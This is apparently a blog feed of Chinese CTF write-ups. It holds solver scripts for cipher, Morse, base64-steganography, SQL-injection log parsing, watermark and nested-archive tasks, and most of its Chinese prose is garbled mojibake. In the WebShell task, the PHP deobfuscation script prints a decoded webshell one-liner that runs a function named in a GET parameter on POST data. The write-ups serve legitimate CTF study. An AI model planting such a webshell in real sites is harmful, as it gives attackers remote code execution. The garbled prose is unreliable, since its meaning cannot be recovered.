class="line">0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, </span><br><span class="line">0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, </span><br><span class="line">0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, </span><br><span class="line">0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, </span><br><span class="line">0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, </span><br><span class="line">0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, </span><br><span class="line">0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, </span><br><span class="line">0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, </span><br><span class="line">0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, </span><br><span class="line">0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, </span><br><span class="line">0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, </span><br><span class="line">0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, </span><br><span class="line">0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, </span><br><span class="line">0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, </span><br><span class="line">0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, </span><br><span class="line">0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, </span><br><span class="line">0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, </span><br><span class="line">0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, </span><br><span class="line">0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, </span><br><span class="line">0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, </span><br><span class="line">0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, </span><br><span class="line">0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, </span><br><span class="line">0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16</span><br></pre></td></tr></table></figure><p>input[i] = Table[(16 * (v3 + v4 % 255) &gt;&gt; 4) + 15) &amp; (v3 + v4 % 255)];</p><h5 id="WEEK2-MISC-æ–°å»ºWordæ–‡æ¡£"><a href="#WEEK2-MISC-æ–°å»ºWordæ–‡æ¡£" class="headerlink" title="WEEK2|MISC æ–°å»ºWordæ–‡æ¡£"></a>WEEK2|MISC æ–°å»ºWordæ–‡æ¡£</h5><p>æ–°ä¸ä½›è®ºç¦…</p><p><code>http://hi.pcmoe.net/buddha.html</code></p><p>æ–°ä½›æ›°ï¼šæ¯˜è«¸éš¸åƒ§é™å½è«¸é™€æ‘©éš¸åƒ§ç¼½è–©é¡˜æ¯˜è€¨å’¤é™€é¡˜ç¾…å’¤å–ƒä¿®é¡˜å®£äº¦å®£å¯‚å»å¯‚é˜¿æ˜¯å½é˜¿å¡å°ŠåŠ«æ¯˜èˆ¬æ¯˜æ‰€èé™æ¯˜å’’å¡å°Šè–©å’’æ¯˜æ‰€è‹¥é™èˆ¬æ–¯æ¯˜åš´æ¯˜åš´æ³¢æ–¯è¿¦æ¯˜è‰²æ¯˜æ³¢åš´æ¯˜å–ƒå¿µè‹¥ä¿®å˜šèˆ¬æ¯˜æˆ‘æ¯˜å¦‚æ¯˜å¦‚å›‘å›‘</p><p><img src="/images/xinshengsai/image-20231123100535460.png" alt="image-20231123100535460"></p><h5 id="WEEK2-MISC-æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"><a href="#WEEK2-MISC-æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢" class="headerlink" title="WEEK2|MISC æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢"></a>WEEK2|MISC æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢</h5><p>æ‰“å¼€æ˜¯ä¸€ä¸ªéŸ³é¢‘ï¼Œæ‘©æ–¯ç”µç ï¼Œç›´æ¥ç”¨morse2ascii å³å¯</p><p><code> morse2ascii secret.wav</code></p><p><img src="/images/xinshengsai/image-20231123101018700.png" alt="image-20231123101018700"></p><h5 id="WEEK2-MISC-1-åºç« "><a href="#WEEK2-MISC-1-åºç« " class="headerlink" title="WEEK2|MISC 1-åºç« "></a>WEEK2|MISC 1-åºç« </h5><p>sqlç›²æ³¨ misc è„šæœ¬</p><p>access.log</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\week2\\access.log&quot;</span>,encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f = f.readlines()</span><br><span class="line">lists = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    s = re.findall(<span class="string">&quot;1\)\)=(.*),sl&quot;</span>,i)</span><br><span class="line">    num = re.findall(<span class="string">&quot;0user\),(.*?),1\)&quot;</span>,i)</span><br><span class="line">    <span class="comment"># lists[num[0]] = s[0]</span></span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    lists[<span class="built_in">int</span>(num[<span class="number">0</span>])]= <span class="built_in">str</span>(s[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(lists.values()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(e)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-base"><a href="#WEEK2-MISC-base" class="headerlink" title="WEEK2|MISC base!"></a>WEEK2|MISC base!</h5><p>base64éšå†™ï¼Œç›´æ¥è„šæœ¬è§£å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc.txtä¸ºå¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²æ‰€åœ¨çš„æ–‡ä»¶</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\week2\\base.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pattern2ç”¨äºåŒ¹é…ä¸¤ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment"># pattern2ç”¨äºåŒ¹é…ä¸€ä¸ªç­‰å·æƒ…å†µæ—¶ï¼Œç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">pattern2 = <span class="string">r&#x27;(\S)==$&#x27;</span></span><br><span class="line">pattern1 = <span class="string">r&#x27;(\S)=$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–åçš„éšå†™äºŒè¿›åˆ¶å­—ç¬¦åŠ å…¥binstringä¸­</span></span><br><span class="line">binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€è¡Œè¯»å–å¾…è§£å¯†çš„base64éšå†™å­—ç¬¦ä¸²ï¼Œé€è¡Œå¤„ç†</span></span><br><span class="line"><span class="keyword">while</span>(base64str):</span><br><span class="line">    <span class="comment"># å…ˆåŒ¹é…ä¸¤ä¸ªç­‰å·çš„æƒ…å†µï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œå†é…ç½®ä¸€ä¸ªç­‰å·çš„æƒ…å†µ</span></span><br><span class="line">    <span class="comment"># å¦‚æœæ— ç­‰å·ï¼Œåˆ™æ²¡æœ‰éšè—ï¼Œæ— éœ€å¤„ç†</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="built_in">compile</span>(pattern2).findall(base64str):</span><br><span class="line">        <span class="comment"># msträ¸ºç­‰å·å‰çš„ä¸€ä¸ªå­—ç¬¦ï¼Œè¯¥å­—ç¬¦ä¸ºéšå†™äºŒè¿›åˆ¶ä¿¡æ¯æ‰€åœ¨çš„å­—ç¬¦</span></span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern2).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># ç¡®è®¤mstrå­—ç¬¦å¯¹åº”çš„base64äºŒè¿›åˆ¶æ•°ï¼Œèµ‹å€¼ç»™mbin</span></span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        <span class="comment"># mbinæ ¼å¼å¦‚0b100ï¼Œmbin[0:2]ä¸º0b</span></span><br><span class="line">        <span class="comment"># mbin[2:].zfill(6)ä¸ºå°†0båé¢çš„äºŒè¿›åˆ¶æ•°å‰é¢è¡¥0ï¼Œä½¿0båé¢çš„é•¿åº¦ä¸º6</span></span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># ä¸¤ä¸ªç­‰å·æƒ…å†µéšå†™äº†4ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å4bit</span></span><br><span class="line">        <span class="comment"># èµ‹å€¼ç»™stegobinï¼Œè¿™å°±æ˜¯éšè—çš„äºŒè¿›åˆ¶ä¿¡æ¯</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">4</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="built_in">compile</span>(pattern1).findall(base64str):</span><br><span class="line">        mstr = re.<span class="built_in">compile</span>(pattern1).findall(base64str)[<span class="number">0</span>]</span><br><span class="line">        mbin = <span class="built_in">bin</span>(b64chars.find(mstr))</span><br><span class="line">        mbin2 = mbin[<span class="number">0</span>:<span class="number">2</span>] + mbin[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">        <span class="comment"># ä¸€ä¸ªç­‰å·æƒ…å†µéšå†™äº†2ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æå–mbin2çš„å2bit</span></span><br><span class="line">        stegobin = mbin2[-<span class="number">2</span>:]</span><br><span class="line">        binstring += stegobin</span><br><span class="line">    base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stegobinå°†å„è¡Œéšè—çš„äºŒè¿›åˆ¶å­—ç¬¦æ‹¼æ¥åœ¨ä¸€èµ·</span></span><br><span class="line"><span class="comment"># ä»ç¬¬0ä½å¼€å§‹ï¼Œ8bitã€8bitå¤„ç†ï¼Œæ‰€ä»¥rangeçš„æ­¥è¿›ä¸º8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binstring),<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># int(xxx,2)ï¼Œå°†äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸º10è¿›åˆ¶çš„æ•´æ•°ï¼Œå†ç”¨chr()è½¬ä¸ºå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binstring[i:i+<span class="number">8</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</span></span><br><span class="line"><span class="comment">#flag&#123;b4se_1s_4_g0od_c0d3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-WebShellçš„åˆ©ç”¨"><a href="#WEEK2-MISC-WebShellçš„åˆ©ç”¨" class="headerlink" title="WEEK2|MISC WebShellçš„åˆ©ç”¨"></a>WEEK2|MISC WebShellçš„åˆ©ç”¨</h5><p>å®˜æ–¹ç»™çš„pocï¼Œä¹Ÿå¯ä»¥æ‰‹æ’•ï¼Œä¸æ˜¯å¾ˆå¤šå±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;å­—ç¬¦ä¸²&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = preg_replace(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">#error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-Jvav"><a href="#WEEK2-MISC-Jvav" class="headerlink" title="WEEK2|MISC Jvav"></a>WEEK2|MISC Jvav</h5><p>javaç›²æ°´å°</p><p>java8 -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\challenge.png s.png</p><p><img src="/images/xinshengsai/image-20231123162930566.png" alt="image-20231123162930566"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è°‹é›†å›¢ctf</title>
      <link href="/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/"/>
      <url>/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/</url>
      
        <content type="html"><![CDATA[<h5 id="å‹ç¼©åŒ…å¤§å¸ˆ"><a href="#å‹ç¼©åŒ…å¤§å¸ˆ" class="headerlink" title="å‹ç¼©åŒ…å¤§å¸ˆ"></a>å‹ç¼©åŒ…å¤§å¸ˆ</h5><p>å¾ˆç®€å•çš„å‹ç¼©åŒ…å¥—å¨ƒï¼Œå¯†ç æ˜¯å‹ç¼©åŒ…çš„å¯†ç <br>pythonè„šæœ¬whindows,ä½†æ˜¯è§£å‹å¾ˆæ…¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  path=<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  zfilefile = path+file</span><br><span class="line"></span><br><span class="line">Â  Â  s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.extractall(path=<span class="string">&#x27;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  z.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.extractall(<span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  f.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># list = zpf.namelist() Â # å¾—åˆ°å‹ç¼©åŒ…é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;)) Â # å¾ªç¯è§£å‹æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•ï¼Œå¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;è§£å‹æˆåŠŸ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] Â == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># åˆ›å»ºRARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è®¾ç½®å¯†ç </span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># è§£å‹RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># å…³é—­RARFileå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  rar.close()</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  path1 = <span class="string">&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># è°ƒç”¨å‡½æ•°è§£å‹å¸¦å¯†ç çš„RARæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span> Â <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span> Â s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf = rarfile.RarFile(zfilefile) Â # å¾…è§£å‹æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># path2 =&quot;D:\\vscodework\\ctf\\2023æ–°ç”Ÿèµ›\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;) Â # è§£å‹æŒ‡å®šæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><p>linux:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 